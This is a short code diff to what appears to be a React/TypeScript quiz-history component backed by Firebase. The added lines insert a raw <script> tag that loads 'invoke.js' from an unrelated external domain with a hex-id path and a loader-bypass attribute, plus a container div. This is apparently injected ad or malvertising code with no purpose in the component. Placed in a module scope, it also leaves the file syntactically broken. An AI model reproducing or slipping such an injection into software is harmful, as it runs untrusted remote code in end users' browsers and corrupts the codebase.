@@ -6,6 +6,9 @@ import { db, auth } from '../services/firebase';
 import { collection, query, where, onSnapshot, deleteDoc, doc, orderBy, limit } from 'firebase/firestore';
 import ConfirmModal from './admin/ConfirmModal';
 
+<script async="async" data-cfasync="false" src="https://defiantenrage.com/d07e9336b60580af4a3b18734a7dfd59/invoke.js"></script>
+<div id="container-d07e9336b60580af4a3b18734a7dfd59"></div>
+
 interface HistoryTabProps {
   history: { exams: QuizResult[], mistakes: Question[], marked: Question[] };
 }
